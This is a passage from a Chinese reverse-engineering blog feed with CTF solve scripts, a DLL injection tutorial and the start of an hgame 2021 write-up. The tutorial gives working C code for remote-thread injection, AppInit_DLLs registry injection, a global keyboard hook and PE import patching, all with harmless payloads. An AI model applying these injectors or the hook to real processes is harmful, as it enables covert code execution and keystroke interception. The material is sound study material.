flag[]=&#123;2,5,4,13,3,84,11,4,87,3,86,3,80,7,83,3,0,4,83,94,7,84,4,0,1,83,3,84,6,83,5,80&#125;;    char key[17]=&quot;6308fe34b7fe6fdb&quot;;    int i;    printf(&quot;flag&#123;&quot;);    for(i=0;i&lt;32;i++)    &#123;        flag[i]=flag[i]^key[i%16];        printf(&quot;%c&quot;,flag[i]);    &#125;    printf(&quot;&#125;&quot;); &#125; </code></pre><p>得到flag{4645e180540ffa7a67cfa174cde105a2}</p><p>方法2，得到解密后的base64字符串后，直接跳过等待。<br><img src="https://i.loli.net/2021/03/29/WaTISndNlCjXR5g.png"><br>继续跑得到flag<br><img src="https://i.loli.net/2021/03/29/jOfTpCWzbXLFhkd.png"></p><h2 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h2><p>看了wp后，这道题比较惊艳到我的地方还是那个栅栏加密，充分利用了int型变量有4个字节，而char型变量只有1个字节。然后用win32的一些函数和花指令将真正的加密函数给隐藏了。通过动调来更能理解这个程序干了什么，什么函数是有用的。</p><p>下面先ida载入看看主函数逻辑<br><img src="https://i.loli.net/2021/03/30/qQI8fST1RE9FG7x.png"><br>然后看看修改IsDebuggerPresent()函数地址的sub_401925函数<br><img src="https://i.loli.net/2021/03/30/ih5SJB8Ekupx6wQ.png"><br>然后现在来去花<br><img src="https://i.loli.net/2021/03/30/tWNZPA5F7wiBMHQ.png"><br>真正的加密函数<br><img src="https://i.loli.net/2021/03/30/DUFVwpR16eIzZWM.png"><br>不得不说这种栅栏加密还是第一次见，通过动调来理解或许会好一些。所以说解密思路就是，先进行栅栏解密，然后再去进行5轮换盒。</p><p>exp</p><pre><code>#include&lt;stdio.h&gt;int main()&#123;    char a[6][4]=&#123;65, 111, 107, 17,                101, 73, 67, 92,                44, 15, 17, 67,                 23, 67, 57, 2,                  61, 77, 76, 15,                   24, 62, 120, 40&#125;;    int b[24];    int table[128]=&#123;0x80,0x65,0x2F,0x34,0x12,0x37,0x7D,0x40,0x26,0x16,0x4B,0x4D,0x55,0x43,0x5C,0x17,0x3F,0x69,0x79,0x53,0x18,0x02,0x06,0x61,0x27,0x08,0x49,0x4A,0x64,0x23,0x56,0x5B,0x6F,0x11,0x4F,0x14,0x04,0x1E,0x5E,0x2D,0x2A,0x32,0x2B,0x6C,0x74,0x09,0x6E,0x42,0x70,0x5A,0x71,0x1C,0x7B,0x2C,0x75,0x54,0x30,0x7E,0x5F,0x0E,0x01,0x46,0x1D,0x20,0x3C,0x66,0x6B,0x76,0x63,0x47,0x6A,0x29,0x25,0x4E,0x31,0x13,0x50,0x51,0x33,0x59,0x1A,0x5D,0x44,0x3E,0x28,0x0F,0x19,0x2E,0x05,0x62,0x4C,0x3A,0x21,0x45,0x1F,0x38,0x7F,0x57,0x3D,0x1B,0x3B,0x24,0x41,0x77,0x6D,0x7A,0x52,0x73,0x07,0x10,0x35,0x0A,0x0D,0x03,0x0B,0x48,0x67,0x15,0x78,0x0C,0x60,0x39,0x36,0x22,0x7C,0x58,0x72,0x68&#125;;    int i,j,n,c=0;    for(i=0;i&lt;4;i++)    &#123;        for(j=0;j&lt;6;j++)        &#123;            b[c]=a[j][i];    //        printf(&quot;%d &quot;,b[c]);            c++;        &#125;    &#125;    printf(&quot;\n&quot;);    for(n=0;n&lt;5;n++)    &#123;        for(i=0;i&lt;24;i++)        &#123;            for(j=0;j&lt;128;j++)            &#123;                if(b[i]==table[j])                &#123;                    b[i]=j;                    break;                &#125;            &#125;        &#125;    &#125;    for(i=0;i&lt;24;i++)    &#123;        printf(&quot;%c&quot;,b[i]);    &#125;&#125;</code></pre><p>得到flag{Sh1t_you_dec0d3_it}，然后md5加密</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DLL注入技术</title>
      <link href="2021/03/09/DLL%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"/>
      <url>2021/03/09/DLL%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="逆向工程核心原理DLL注入"><a href="#逆向工程核心原理DLL注入" class="headerlink" title="逆向工程核心原理DLL注入"></a>逆向工程核心原理DLL注入</h2><p>前言：学这一部分知识最好先学一部分win32API编程的知识，分析源代码就会容易一些。</p><p><strong>DLL注入概念</strong></p><p>DLL注入指的是向运行中的其他进程强制插入特定的DLL文件。从技术细节来说，DLL注入命令其他进程自行调用LoadLibrary()API，加载用户指定的DLL文件。DLL注入与其他一般的DLL加载在于，加载的目标进程是其自身或其他进程。</p><p><strong>DLL注入技术的作用</strong></p><p>DLL注入技术可以被正常软件用来添加/扩展其他程序，调试或逆向工程的功能性；该技术也常被恶意软件以多种方式利用。</p><p><strong>三种DLL注入的方法：</strong></p><ol><li>创建远端线程（CreateRemoteThread()API）</li><li>使用注册表（AppInit_DLLs值）</li><li>消息钩取（SetWindowsHookEx()API）</li><li>通过修改pe文件来加载DLL文件</li></ol><h3 id="创建远端线程（CreateRemoteThread-API）"><a href="#创建远端线程（CreateRemoteThread-API）" class="headerlink" title="创建远端线程（CreateRemoteThread()API）"></a>创建远端线程（CreateRemoteThread()API）</h3><p>大概原理就是通过CreateRemoteThread()API来使目标进程调用LoadLibrary()API，加载我们写好的DLL。</p><h4 id="InjectDll-exe"><a href="#InjectDll-exe" class="headerlink" title="InjectDll.exe"></a>InjectDll.exe</h4><p>这个程序用来像目标进程注入我们的DLL，源代码如下</p><pre><code>#include&quot;Windows.h&quot;#include&quot;tchar.h&quot;#include&quot;stdio.h&quot;BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)&#123;    HANDLE hProcess = NULL, hThread = NULL;//目标进程的句柄     HMODULE hMod = NULL;                       LPVOID pRemoteBuf = NULL;              //向目标进程申请内存空间的首地址。     DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);//我们写的DLL路径的字符串长度大小，记得加一个1，字符串以&#39;\0&#39;结尾。     LPTHREAD_START_ROUTINE pThreadProc;    //线程的起点函数地址。      //获得目标进程的句柄，让我们可以操作这个进程     if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))    &#123;        _tprintf(L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;, dwPID, GetLastError());        return false;    &#125;    //向目标进程申请一个可以存放DLL路径字符串长度大小的空间。     pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);    //将DLL路径字符串写人这个申请的空间。     WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);     //获取&quot;kernel32.dll&quot;动态链接库的模块句柄，用来调用其中的&quot;LoadLibraryW&quot;函数。     hMod = GetModuleHandle(L&quot;kernel32.dll&quot;);    //所执行的线程函数地址设置为LoadLibraryW()API函数，使这个函数调用pRemoteBuf这个参数，也就是加载我们的DLL。     pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, &quot;LoadLibraryW&quot;);    //创建一个线程，hProcess为目标进程， pThreadProc为线程函数地址， pRemoteBuf为向这个函数传入的参数。     hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);    WaitForSingleObject(hThread, INFINITE);    CloseHandle(hThread);   //关闭线程句柄     CloseHandle(hProcess);  //关闭进程句柄     return TRUE;&#125;int _tmain(int argc, TCHAR* argv[])&#123;    if(argc!=3)//这里是描述使用方法     &#123;        _tprintf(L&quot;USAGE:%s pid dll_path\n&quot;, argv[0]);        return 1;    &#125;    if (InjectDll((DWORD)_tstol(argv[1]), argv[2]))  //argv[1]是目标进程的PID， argv[2]是我们要注入DLL的绝对地址。 然后_tstol是将字符串型的PID转为整型的。        _tprintf(L&quot;InjectDll(\&quot;%s\&quot;) success!!!\n&quot;, argv[2]);    else        _tprintf(L&quot;InjectDll(\&quot;%s\&quot;) failed!!!\n&quot;, argv[2]);    return 0;&#125;</code></pre><p>将这个代码在Visual Studio 2019中用win32来生成exe文件，得到InjectDll.exe。下面是一些函数的解释。</p><p><strong>GetModuleHandle()API</strong></p><p>获取一个应用程序或动态链接库的模块句柄。</p><pre><code>HMODULE GetModuleHandle(    LPCTSTR lpModuleName //lpModuleName String，指定模块名，这通常是与模块的文件名相同的一个名字。);</code></pre><p><strong>VirtualAllocEx()API</strong></p><p>在指定进程的虚拟空间保留或提交内存区域</p><pre><code>LPVOID VirtualAllocEx(    HANDLE hProcess,    LPVOID lpAddress,    SIZE_T dwSize,    DWORD flAllocationType,    DWORD flProtect);hProcess：申请内存所在的进程句柄。lpAddress：保留页面的内存地址；一般用NULL自动分配 。dwSize：欲分配的内存大小，字节单位；注意实际分 配的内存大小是页内存大小的整数倍flAllocationType可取下列值：MEM_COMMIT：为特定的页面区域分配内存中或磁盘的页面文件中的物理存储MEM_PHYSICAL ：分配物理内存（仅用于地址窗口扩展内存）MEM_RESERVE：保留进程的虚拟地址空间，而不分配任何物理存储。保留页面可通过继续调用VirtualAlloc（）而被占用MEM_RESET ：指明在内存中由参数lpAddress和dwSize指定的数据无效MEM_TOP_DOWN：在尽可能高的地址上分配内存（Windows 98忽略此标志）MEM_WRITE_WATCH：必须与MEM_RESERVE一起指定，使系统跟踪那些被写入分配区域的页面（仅针对Windows 98）flProtect可取下列值：PAGE_READONLY： 该区域为只读。如果应用程序试图访问区域中的页的时候，将会被拒绝访PAGE_READWRITE 区域可被应用程序读写PAGE_EXECUTE： 区域包含可被系统执行的代码。试图读写该区域的操作将被拒绝。PAGE_EXECUTE_READ ：区域包含可执行代码，应用程序可以读该区域。PAGE_EXECUTE_READWRITE： 区域包含可执行代码，应用程序可以读写该区域。PAGE_GUARD： 区域第一次被访问时进入一个STATUS_GUARD_PAGE异常，这个标志要和其他保护标志合并使用，表明区域被第一次访问的权限PAGE_NOACCESS： 任何访问该区域的操作将被拒绝PAGE_NOCACHE： RAM中的页映射到该区域时将不会被微处理器缓存（cached)注:PAGE_GUARD和PAGE_NOCHACHE标志可以和其他标志合并使用以进一步指定页的特征。PAGE_GUARD标志指定了一个防护页（guard page），即当一个页被提交时会因第一次被访问而产生一个one-shot异常，接着取得指定的访问权限。PAGE_NOCACHE防止当它映射到虚拟页的时候被微处理器缓存。这个标志方便设备驱动使用直接内存访问方式（DMA）来共享内存块。返回值：执行成功就返回分配内存的首地址，不成功就是NULL。</code></pre><p><strong>WriteProcessMemory()</strong></p><p>此函数能写入某一进程的内存区域，故需此函数入口区必须可以访问，否则操作将失败。</p><pre><code>BOOL WriteProcessMemory(    HANDLE hProcess,  //由OpenProcess返回的进程句柄。    LPVOID lpBaseAddress,  //要写的内存首地址    LPVOID lpBuffer,  //指向要写的数据的指针。    DWORD nSize,  //要写入的字节数。    LPDWORD lpNumberOfBytesWritten);</code></pre><p><strong>GetProcAddress()</strong></p><p>获得函数地址</p><pre><code>FARPROC GetProcAddress(    HMODULE hModule, // DLL模块句柄    LPCSTR lpProcName // 函数名);</code></pre><p><strong>CreateRemoteThread()</strong></p><p>在目标进程中创建一个线程</p><pre><code>HANDLE WINAPI CreateRemoteThread(__in HANDLE hProcess,  //线程所属进程的进程句柄.__in LPSECURITY_ATTRIBUTES lpThreadAttributes,  //一个指向 SECURITY_ATTRIBUTES 结构的指针, 该结构指定了线程的安全属性.__in SIZE_T dwStackSize,   //线程栈初始大小,以字节为单位,如果该值设为0,那么使用系统默认大小.__in LPTHREAD_START_ROUTINE lpStartAddress,    //在远程进程的地址空间中,该线程的线程函数的起始地址.__in LPVOID lpParameter,   //传给线程函数的参数.__in DWORD dwCreationFlags,   __out LPDWORD lpThreadId   //指向所创建线程ID的指针,如果创建失败,该参数为NULL.);</code></pre><h4 id="myhack-dll"><a href="#myhack-dll" class="headerlink" title="myhack.dll"></a>myhack.dll</h4><p>根据书上改了一下，变成了弹出一个窗口的dll动态链接库</p><pre><code>// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;windows.h&quot;#include &quot;tchar.h&quot;#include &quot;pch.h&quot;DWORD WINAPI ThreadProc(LPVOID lParam)//弹出一个输出hellow world的窗口&#123;    CHAR message[]=&quot;hellow world&quot;;    CHAR title[]=&quot;messagebox&quot;;    MessageBoxA(NULL,message,title,MB_OK);    return 0;&#125;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123;    HANDLE hThread = NULL;    switch (fdwReason)    &#123;    case DLL_PROCESS_ATTACH:        OutputDebugString(L&quot;&lt;myhack.dll&gt; Injection!!!&quot;);//在Debugview里面输出字符串        hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); //创建一个线程        CloseHandle(hThread);        break;    &#125;    return TRUE;&#125;</code></pre><p>将InjectDll.exe，和myhack.dll都放在D盘下，打开32位的notepad.exe然后用管理员权限的cmd来执行命令。<br><img src="https://i.loli.net/2021/03/07/PJHU7dn198LCIuX.png"><br>效果如下<br><img src="https://i.loli.net/2021/03/07/pg3HcyKQW9Lqonf.png"><br>看了后面的内容，根据代码改了一下InjectDll.exe的代码，可以不用查看PID了，只需要提供进程的名称，详细内容请看另一篇博客win32编程学习笔记。</p><pre><code>#include&quot;Windows.h&quot;#include&quot;tchar.h&quot;#include &quot;tlhelp32.h&quot;#include&quot;stdio.h&quot;DWORD FindProcessID(LPCTSTR szProcessName)&#123;    DWORD dwPID = 0xFFFFFFFF;    HANDLE hSnapShot = INVALID_HANDLE_VALUE;    PROCESSENTRY32 pe;    // Get the snapshot of the system    pe.dwSize = sizeof(PROCESSENTRY32);    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);    // find process    Process32First(hSnapShot, &amp;pe);    do    &#123;        if (!_tcsicmp(szProcessName, (LPCTSTR)pe.szExeFile))        &#123;            dwPID = pe.th32ProcessID;            break;        &#125;    &#125; while (Process32Next(hSnapShot, &amp;pe));    CloseHandle(hSnapShot);    return dwPID;&#125;BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)&#123;    HANDLE hProcess = NULL, hThread = NULL;    HMODULE hMod = NULL;    LPVOID pRemoteBuf = NULL;    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);    LPTHREAD_START_ROUTINE pThreadProc;    if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))    &#123;        _tprintf(L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;, dwPID, GetLastError());        return false;    &#125;    pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);    hMod = GetModuleHandle(L&quot;kernel32.dll&quot;);    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, &quot;LoadLibraryW&quot;);    hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);    WaitForSingleObject(hThread, INFINITE);    CloseHandle(hThread);    CloseHandle(hProcess);    return TRUE;&#125;int _tmain(int argc, TCHAR* argv[])&#123;    DWORD PID;    if (argc != 3)    &#123;        _tprintf(L&quot;USAGE:%s processname dll_path\n&quot;, argv[0]);        return 1;    &#125;    PID = FindProcessID(argv[1]);    if (InjectDll(PID, argv[2]))        _tprintf(L&quot;InjectDll(\&quot;%s\&quot;) success!!!\n&quot;, argv[2]);    else        _tprintf(L&quot;InjectDll(\&quot;%s\&quot;) failed!!!\n&quot;, argv[2]);    return 0;&#125;</code></pre><h3 id="使用注册表（AppInit-DLLs值）"><a href="#使用注册表（AppInit-DLLs值）" class="headerlink" title="使用注册表（AppInit_DLLs值）"></a>使用注册表（AppInit_DLLs值）</h3><p>通过修改注册表来注入DLL。</p><h4 id="myhack2-dll"><a href="#myhack2-dll" class="headerlink" title="myhack2.dll"></a>myhack2.dll</h4><p>简单做了一些改动，变成了，不隐藏打开一个网页。如果要隐藏的话改一下pi结构体的一些内容就行了。</p><pre><code>// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;#include &quot;windows.h&quot;#include &quot;tchar.h&quot;#include &quot;stdio.h&quot;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123;    TCHAR szPath[MAX_PATH] = &#123; 0, &#125;;    TCHAR szChildname[] = TEXT(&quot;D:/Firefox/firefox.exe&quot;);    TCHAR szURL[] = TEXT(&quot; https://the_itach1.gitee.io/&quot;);    TCHAR process[] = TEXT(&quot;notepad.exe&quot;);    TCHAR* p = NULL;    STARTUPINFO si = &#123; 0, &#125;;    PROCESS_INFORMATION pi = &#123; 0, &#125;;    si.cb = sizeof(STARTUPINFO);    switch (fdwReason)    &#123;    case DLL_PROCESS_ATTACH:        if (!GetModuleFileName(NULL, szPath, MAX_PATH))            break;        if (!(p = _tcsrchr(szPath, &#39;\\&#39;)))              break;        if (_tcsicmp(p + 1, process))      //确保当前进程是notepad.exe，才会进行这些操作，也可以根据需要来改变进程对象。            break;        if (!CreateProcess(szChildname, (LPTSTR)(LPCTSTR)szURL,            NULL, NULL, FALSE,            0,            NULL, NULL, &amp;si, &amp;pi))            break;        if (pi.hProcess != NULL)            CloseHandle(pi.hProcess);        break;    &#125;    return TRUE;&#125;</code></pre><p>在运行里面输入regedit.exe，打开注册表编辑器，然后就如下图所示进行改动。<br><img src="https://i.loli.net/2021/03/07/LalP5cvkGJRNYCT.png"><br>然后重启计算机，就可以发现myhack.dll已经注入到了user32.dll加载的所有进程。(不知道什么原因我电脑好像不行，哈哈哈)。</p><h3 id="消息钩取（SetWindowsHookEx-API）"><a href="#消息钩取（SetWindowsHookEx-API）" class="headerlink" title="消息钩取（SetWindowsHookEx()API）"></a>消息钩取（SetWindowsHookEx()API）</h3><p>目前不知道怎么将截取的键盘信息输出到debugview。</p><h4 id="hookmain-exe"><a href="#hookmain-exe" class="headerlink" title="hookmain.exe"></a>hookmain.exe</h4><p>hookmain.exe就相当于一个药引吧，主要用来加载dll里面的两个函数。至于为什么不能直接写一个exe文件来钩取键盘记录，我认为是以因为SetWindowsHookEx()这个函数的特性就就决定了它只能在DLL中存在，下面会给SetWindowsHookEx()函数的一些介绍。</p><pre><code>#include &quot;stdio.h&quot;#include &quot;conio.h&quot;#include &quot;windows.h&quot;#define    DEF_DLL_NAME        &quot;KeyHook.dll&quot;#define    DEF_HOOKSTART        &quot;HookStart&quot;#define    DEF_HOOKSTOP        &quot;HookStop&quot;typedef void (*PFN_HOOKSTART)();//这里是定义了两个函数指针。typedef void (*PFN_HOOKSTOP)();void main()&#123;    HMODULE            hDll = NULL;    PFN_HOOKSTART    HookStart = NULL;    PFN_HOOKSTOP    HookStop = NULL;    char            ch = 0;    hDll = LoadLibraryA(DEF_DLL_NAME);//加载KeyHook.dll，获得dll的句柄    if (hDll == NULL)    &#123;        printf(&quot;LoadLibrary(%s) failed!!! [%d]&quot;, DEF_DLL_NAME, GetLastError());        return;    &#125;    HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);//利用GetProcAddress()获得HookStart的函数地址    HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);//利用GetProcAddress()获得HookStop的函数地址    HookStart();//开始钩取函数    printf(&quot;press &#39;q&#39; to quit!\n&quot;);    while (_getch() != &#39;q&#39;);//遇到键盘输入q就退出    HookStop();//退出钩取函数    FreeLibrary(hDll);&#125;</code></pre><h4 id="KeyHook-dll"><a href="#KeyHook-dll" class="headerlink" title="KeyHook.dll"></a>KeyHook.dll</h4><p>最重要的就是SetWindowsHookEx()，和KeyBoardProc()这个回调函数了。</p><p><strong>SetWindowsHookEx()</strong></p><pre><code>HHOOK WINAPI SetWindowsHookEx（  _In_  int    idHook，　　　　　　　　　　　　设置钩子的类型.意思就是我要设置的钩子是什么钩子. 可以是监视窗口过程.可以是监视消息队列.  _In_ HOOKPROC lpfn，　　　　　　　　　　　　 根据钩子类型.设置不同的回调函数.  _In_ HINSTANCE hMod，　　　　　　　　　　　　钩子设置的Dll实例句柄,就是DLL的句柄  _In_ DWORD dwThreadId　　　　　　　　　　   设置钩子的线程ID. 如果为0 则设置为全局钩子.）;　　HHOOK 返回值. 是一个钩子过程句柄.原型  SetWindowsHookEx(WH_KEYBOARD, KeyBoardProc, HInstance, 0);</code></pre><p><strong>KeyBoardProc()</strong></p><pre><code>首先键盘钩子处理函数的函数名是可以自定义的 ，例如：MyKeyboardProc()函数原型：LRESULT CALLBACK KeyboardProc(     int code,    WPARAM wParam,    LPARAM lParam);code：根据这个数值决定怎样处理消息如果 code 小于0，则 必须让KeyboardProc()函数返回CallNextHookEx()wParam：按键的虚拟键值消息，例如:VK_F1lParam:32位内存，内容描述包括：指定扩展键值，扫描码，上下文，重复次数。这里只用到了第31位就只给31位的解释吧。31位,指定转变状态：31位为0时候，按键正在被按下，为1时候，按键正在被释放返回值：如果参数1:code小于0，则必须 返回CallNextHookEx(),也就是返回CallNextHookEx()的返回值如果参数1:code大于等于0，并且钩子处理函数没有处理消息，强烈建议您 返回CallNextHookEx()的返回值，否则当您安装WH_KEYBOARD钩子时，钩子将不会得到通知，并返回错误结果。**如果钩子处理的消息，您可以返回一个非0值，防止系统把消息传递给钩子链中的下一个钩子，或者把消息发送到目标窗口。**</code></pre><p>可以根据需要来决定截取那一个进程的键盘消息。</p><pre><code>#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#include &quot;pch.h&quot;#define DEF_PROCESS_NAME        &quot;notepad.exe&quot;HINSTANCE g_hInstance = NULL;HHOOK g_hHook = NULL;HWND g_hWnd = NULL;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)&#123;    switch (dwReason)    &#123;    case DLL_PROCESS_ATTACH:        g_hInstance = hinstDLL;//获取该DLL的句柄。        break;    case DLL_PROCESS_DETACH:        break;    &#125;    return TRUE;&#125;LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)&#123;    char szPath[MAX_PATH] = &#123; 0, &#125;;    char* p = NULL;    if (nCode &gt;= 0)    &#123;        // 根据lParam的31位判断是否有按键输入        if (!(lParam &amp; 0x80000000))         &#123;            GetModuleFileNameA(NULL, szPath, MAX_PATH);            p = strrchr(szPath, &#39;\\&#39;);            if (!_stricmp(p + 1, DEF_PROCESS_NAME))//看当前进程是否是notepad.exe            &#123;                OutputDebugString(L&quot;successful&quot;);//用Debugview输出successful来确定注入成功                return 1；//返回一个非0值，防止系统把消息传递给钩子链中的下一个钩子，这样notepad就不会有键盘消息了。            &#125;        &#125;    &#125;    return CallNextHookEx(g_hHook, nCode, wParam, lParam);&#125;#ifdef __cplusplusextern &quot;C&quot; &#123;#endif    __declspec(dllexport) void HookStart()    &#123;        g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0);   //调用SetWindowsHookEx()函数    &#125;    __declspec(dllexport) void HookStop()    &#123;        if (g_hHook)        &#123;            UnhookWindowsHookEx(g_hHook);  //结束钩取函数            g_hHook = NULL;        &#125;    &#125;#ifdef __cplusplus&#125;#endif</code></pre><p>根据需要选择32位还是64位的，我这里是选择的64位的，查看结果如下<br><img src="https://i.loli.net/2021/03/09/vzjMuLNC98AYiG1.png"></p><p>但是会出现一些问题，就是如果尝试在其他64位进程中输入消息，会出现未响应的情况，网上搜了一下，感觉这个消息比较合理。</p><p>如果你认真看SetWindowsHookEx的文档的话，会看到在你的DLL因为CPU架构不匹配而不能注入目标程序的时候，被钩的程序是通过SendMessage来调用你的KeyboardProc的。然后你的KeyboardProc卡在了对话框那里没有返回，所以这些程序的界面就卡在SendMessage那里了。  在64位Windows上，大多数程序是32位。资源管理器是64位。</p><h3 id="通过修改pe文件来加载DLL文件"><a href="#通过修改pe文件来加载DLL文件" class="headerlink" title="通过修改pe文件来加载DLL文件"></a>通过修改pe文件来加载DLL文件</h3><h4 id="myhack3-dll"><a href="#myhack3-dll" class="headerlink" title="myhack3.dll"></a>myhack3.dll</h4><p>改了书上的，书上代码太复杂了，而且不知道什么原因(可能是访问的Google吧)，注入成功了也看不到效果，就改了一个输出一个窗口(简单嘛)。</p><pre><code>#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#include &quot;pch.h&quot;#include &quot;tchar.h&quot;#pragma comment(lib, &quot;Wininet.lib&quot;)HWND g_hWnd = NULL;#ifdef __cplusplusextern &quot;C&quot; &#123;#endif    __declspec(dllexport) void fun()  //根据形式要求，必须设置一个导出函数，我这里是将函数名设置为fun。    &#123;        return;    &#125;#ifdef __cplusplus&#125;#endifDWORD WINAPI ThreadProc(LPVOID lParam)&#123;    MessageBoxA(NULL, &quot;The_Itach1&quot;, &quot;Reverse Corse&quot;, MB_OK);    return 0;&#125;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123;    switch (fdwReason)    &#123;    case DLL_PROCESS_ATTACH:        CloseHandle(CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL));        break;    &#125;    return TRUE;&#125;</code></pre><h4 id="修改TextView-exe"><a href="#修改TextView-exe" class="headerlink" title="修改TextView.exe"></a>修改TextView.exe</h4><p>Import Directory Table由IMAGE_IMPORT_DESCRIPTOR结构体组成。</p><pre><code>typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123;    union &#123;        DWORD Characteristics;        DWORD OriginalFirstThunk;            //INT(Import Name Table) address (RVA)    &#125;;    DWORD TimeDateStamp;    DWORD ForwarderChain;    DWORD Name;                                //library name string address (RVA)    DWORD FirstThunk;                        //IAT(Import Address Table) address (RVA)&#125; IMAGE_IMPORT_DESCRIPTOR;typedef struct _IMAGE_IMPORT_BY_NAME &#123;    WORD Hint;                                //ordinal    BYTE Name[1];                            //function name string</code></pre><p>用pe view打开可以发现Import Directory Table的后面已经有了其他代码，所以不能添写更多的IMAGE_IMPORT_DESCRIPTOR结构体了，所以要选择另一片区域来设置Import Directory Table，然后设置到了.rdate节区。</p><p>先将原来Import Directory Table(RAV=84CC)的64个字节的数据复制到选择的null-padding位置。然后再加上myhack3.dll的IMAGE_IMPORT_DESCRIPTOR。<br><img src="https://i.loli.net/2021/03/09/IPKsRdwOMujrE7o.png"></p><p>然后修改新Import Directory Table在文件中的位置和大小，还要修改IAT节区的可写属性。</p><p><img src="https://i.loli.net/2021/03/09/cdlWkBhipqV6Umu.png"><br>然后保存，将修改后的TextView.exe和myhack.dll放在一起，运行TextView.exe，得到<br><img src="https://i.loli.net/2021/03/09/x3FadZLlXVGJ7qr.png"></p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 《逆原》 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame2021的wp</title>
      <link href="2021/02/27/hgame/"/>
      <url>2021/02/27/hgame/</url>
      
        <content type="html"><![CDATA[<h1 id="hgame"><a href="#hgame" class="headerlink" title="hgame"></a>hgame</h1><p>re方向的，太菜了，很多题都做不来。</p><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="helloRe"><a href="#helloRe" class="headerlink" title="helloRe"></a>helloRe</h3><p>ida打开，通过动调找到加密位置，也不能完全动调样，会出一些问题。<br><img src="https://i.loli.net/2021/02/27/YhH2k59yEdcXSTl.png"><br>脚本如下</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int code[23]=&#123; 0x97, 0x99, 0x9C, 0x91, 0x9E, 0x81, 0x91, 0x9D, 0x9B, 0x9A,   0x9A, 0xAB, 0x81, 0x97, 0xAE, 0x80, 0x83, 0x8F, 0x94, 0x89, 0x99, 0x97&#125;;      int key[23]=&#123;0xff,0xfe,0xfd,0xfc,0xfb,0xfa,0xf9,0xf8,0xf7,0xf6,0xf5,0xf4,0xf3,0xf2,0xf1,      0xf0,0xef,0xee,0xed,0xec,0xeb,0xea&#125;;      int i;      for(i=0;i&lt;22;i++)      &#123;          printf(&quot;%c&quot;,code[i]^key[i]);    &#125;&#125;</code></pre><p>得到hgame{hello_re_player}</p><h3 id="pypy"><a href="#pypy" class="headerlink" title="pypy"></a>pypy</h3><p>打开网页出现的是python的字节码，了解一下字节码<a href="https://zhuanlan.zhihu.com/p/45101508">https://zhuanlan.zhihu.com/p/45101508</a></p><pre><code>  4           0 LOAD_GLOBAL              0 (input)              2 LOAD_CONST               1 (&#39;give me your flag:\n&#39;)              4 CALL_FUNCTION            1              6 STORE_FAST               0 (raw_flag)  5           8 LOAD_GLOBAL              1 (list)             10 LOAD_FAST                0 (raw_flag)             12 LOAD_CONST               2 (6)             14 LOAD_CONST               3 (-1)             16 BUILD_SLICE              2             18 BINARY_SUBSCR             20 CALL_FUNCTION            1             22 STORE_FAST               1 (cipher)  6          24 LOAD_GLOBAL              2 (len)             26 LOAD_FAST                1 (cipher)             28 CALL_FUNCTION            1             30 STORE_FAST               2 (length)  8          32 LOAD_GLOBAL              3 (range)             34 LOAD_FAST                2 (length)             36 LOAD_CONST               4 (2)             38 BINARY_FLOOR_DIVIDE             40 CALL_FUNCTION            1             42 GET_ITER        &gt;&gt;   44 FOR_ITER                54 (to 100)             46 STORE_FAST               3 (i)  9          48 LOAD_FAST                1 (cipher)             50 LOAD_CONST               4 (2)             52 LOAD_FAST                3 (i)             54 BINARY_MULTIPLY             56 LOAD_CONST               5 (1)             58 BINARY_ADD             60 BINARY_SUBSCR             62 LOAD_FAST                1 (cipher)             64 LOAD_CONST               4 (2)             66 LOAD_FAST                3 (i)             68 BINARY_MULTIPLY 